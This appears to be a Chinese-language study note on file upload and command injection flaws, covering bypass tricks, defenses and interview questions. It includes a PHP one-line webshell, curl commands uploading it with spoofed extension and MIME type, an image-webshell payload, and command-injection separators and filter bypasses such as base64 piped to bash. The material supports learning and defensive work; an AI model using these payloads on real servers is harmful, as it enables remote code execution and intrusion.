# 文件上传与命令注入学习笔记

文件上传与命令注入是直接获取服务器权限（RCE）的关键漏洞。本笔记记录两者的原理、利用、绕过与防御。

## 一、文件上传 (File Upload)

### 1. 原理
Web 应用允许用户上传文件，但未对文件类型、内容进行严格校验，攻击者可以上传 WebShell（如 `.php`、`.jsp`），从而执行任意命令。

### 2. 常见校验与绕过方式

| 校验类型 | 校验方式 | 绕过手法 |
|:---|:---|:---|
| **前端校验** | JS 验证文件后缀 | Burp 抓包直接改后缀，或禁用 JS |
| **MIME 校验** | 检查 `Content-Type` | 修改为 `image/jpeg`、`image/png` |
| **后缀黑名单** | 拦截 `.php`、`.asp` | 使用 `.phtml`、`.php5`、`.phar`、大小写、`.php.jpg`、`.php%00.jpg` |
| **文件头校验** | 检查 Magic Bytes（如 `GIF89a`） | 制作图片马（真图片 + PHP 代码），配合文件包含（LFI）执行 |
| **目录限制** | 限制上传目录执行权限 | 结合 `.htaccess` 重新定义解析规则 |

### 3. 实战利用流程
```bash
# 1. 构造一句话木马
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

# 2. 上传（模拟 Burp 改包）
curl -u admin:admin*** -F "file=@/tmp/shell.php;filename=shell.phar;type=image/jpeg" http://x.x.x.x/upload.php

# 3. 访问 WebShell
curl "http://x.x.x.x/uploads/shell.phar?cmd=id"
```

### 4. 防御建议
- **白名单校验（核心）**：只允许 `jpg|png|gif`，杜绝使用黑名单。
- **重命名文件**：上传后强制重命名为时间戳+随机字符，去除原后缀。
- **限制执行权限**：上传目录禁止解析 PHP/ASP 等脚本。
- **校验文件头**：结合 `getimagesize()` 和 Magic Bytes 校验，防止图片马。

## 二、命令注入 (Command Injection)

### 1. 原理
应用将用户输入拼接进系统命令中执行，且未做严格的过滤，导致攻击者可以执行任意系统命令。

```php
// 危险代码示例
$ip = $_GET['ip'];
system("ping -c 1 " . $ip);
```

### 2. 命令连接符
| 符号 | 含义 | 示例 |
|:---|:---|:---|
| `;` | 顺序执行 | `127.0.0.1; whoami` |
| `\|` | 管道符，前一个命令的输出作为后一个的输入 | `127.0.0.1 \| whoami` |
| `&&` | 前一个成功才执行后一个 | `127.0.0.1 && whoami` |
| `\|\|` | 前一个失败才执行后一个 | `127.0.0.1 \|\| whoami` |
| `` ` `` | 命令替换 | `` 127.0.0.1 `whoami` `` |
| `$()` | 命令替换 | `127.0.0.1 $(whoami)` |
| `%0a` | 换行符，充当分隔符 | `127.0.0.1%0awhoami` |

### 3. 常见过滤与绕过
- **过滤空格**：使用 `${IFS}`、`%09`（Tab）、`<` 或 `$IFS$9` 代替空格。
- **过滤关键字**：变量拼接（如 `a=c; b=at; $a$b /flag`）、Base64 编码（`echo Y2F0... | base64 -d | bash`）、反斜杠转义（`c\at /flag`）。
- **过滤连接符**：寻找遗漏的符号，如换行符 `%0a`、反引号。
- **无回显盲注**：利用 DNSLog 外带数据，或者写入文件后再通过 Web 访问。

### 4. 防御建议
- **白名单校验（核心）**：严格校验输入格式，例如使用 `is_numeric()` 确保输入为纯数字。
- **禁用危险函数**：在 `php.ini` 中禁用 `system`、`exec`、`shell_exec`、`passthru` 等。
- **最小权限**：Web 进程以低权限用户运行，避免命令执行后直接获取高权限。
- **参数化调用**：如果必须调用系统命令，使用参数化形式（如 `escapeshellarg` 和 `escapeshellcmd`）。

## 三、面试高频问题

**Q1：文件上传怎么绕过白名单？**
A：白名单很难直接绕过，通常需要配合其他漏洞：
1. 利用文件包含漏洞（LFI）执行图片马。
2. 利用服务器解析漏洞（如 Apache 多后缀解析、Nginx 解析漏洞）。
3. 寻找其他未纳入安全测试的上传点。

**Q2：命令注入黑名单绕过的本质是什么？**
A：黑名单永远有遗漏（如 `%0a`、`${IFS}`）。只有白名单（如 `is_numeric`）才是真正的防护。在 CTF 中，我们需要不断尝试被遗漏的字符或利用编码、变量拼接来绕过。

**Q3：如何结合文件上传和文件包含拿 Shell？**
A：首先制作图片马（`GIF89a<?php system($_GET['cmd']); ?>`），通过文件上传接口上传（绕过后缀和 MIME 校验）。然后利用文件包含漏洞（LFI）包含该图片文件，使得 PHP 代码被执行，从而获取 WebShell。
